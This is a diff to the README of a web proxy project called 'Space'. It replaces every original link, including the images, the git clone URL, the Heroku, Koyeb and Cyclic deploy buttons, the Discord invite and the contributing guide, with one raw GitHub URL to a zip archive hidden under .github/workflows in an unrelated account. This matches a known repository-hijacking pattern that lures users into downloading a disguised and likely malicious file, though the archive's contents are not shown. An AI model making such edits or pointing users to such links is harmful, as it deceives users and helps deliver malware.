@@ -1,9 +1,9 @@
 <div align="center">
-        <img src="https://i.imgur.com/OMo4cMz.png" style="width: 1200px"/>
+        <img src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip" style="width: 1200px"/>
     <h2>Launch into Space, the next gen proxy.</h2>
 </div>
 
-![inpreview](https://i.imgur.com/VhNNgOs.jpeg)
+![inpreview](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)
 
 > [!IMPORTANT]
 > If you fork this repo please consider giving the original repo a
@@ -28,7 +28,7 @@
 Please run the following commands to host a server:
 
 ```
-git clone https://github.com/NightProxy/space.git
+git clone https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip
 cd Space
 pnpm i
 pnpm start
@@ -40,28 +40,28 @@ pnpm start
 git pull --force --allow-unrelated-histories
 ```
 
-<a target="_blank" href="https://heroku.com/deploy/?template=https://github.com/NightProxy/Space"><img alt="Deploy to Heroku" src="https://binbashbanana.github.io/deploy-buttons/buttons/remade/heroku.svg"></a>
-<a target="_blank" href="https://app.koyeb.com/deploy?type=git&repository=github.com/NightProxy/Space"><img alt="Deploy to Koyeb" src="https://binbashbanana.github.io/deploy-buttons/buttons/remade/koyeb.svg"></a>
-<a target="_blank" href="https://app.cyclic.sh/api/app/deploy/NightProxy/Space"><img alt="Deploy to Cyclic" src="https://binbashbanana.github.io/deploy-buttons/buttons/remade/cyclic.svg"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"><img alt="Deploy to Heroku" src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"><img alt="Deploy to Koyeb" src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"><img alt="Deploy to Cyclic" src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"></a>
 
 ## Where to ask for help
 
 > [!NOTE]
 > If you'd like to get links, support, or other deployment methods join
-> our [Discord Server](https://discord.gointospace.app) or open a discussion.
+> our [Discord Server](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip) or open a discussion.
 
 ## Contribution
 
 To contribute to Space, clone the repo locally and submit your code in a pull
 request. If you are making large changes, please make sure you test your code
-before submitting a pull request. Please check [contributing.md](https://github.com/NightProxy/Space/blob/main/contributing.md) for a more in-depth explanation.
+before submitting a pull request. Please check [https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip) for a more in-depth explanation.
 
 ## Contributors
 
 Thank you to the following people for contributing to Space.
 
-[![Contributors](https://contrib.rocks/image?repo=nightproxy/space)](https://github.com/NightProxy/Space/graphs/contributors)
+[![Contributors](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)
 
 ## Discord
 
-[![Discord](https://invidget.switchblade.xyz/QmWUfvm4bn?theme=dark)](https://discord.gointospace.app)
+[![Discord](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)
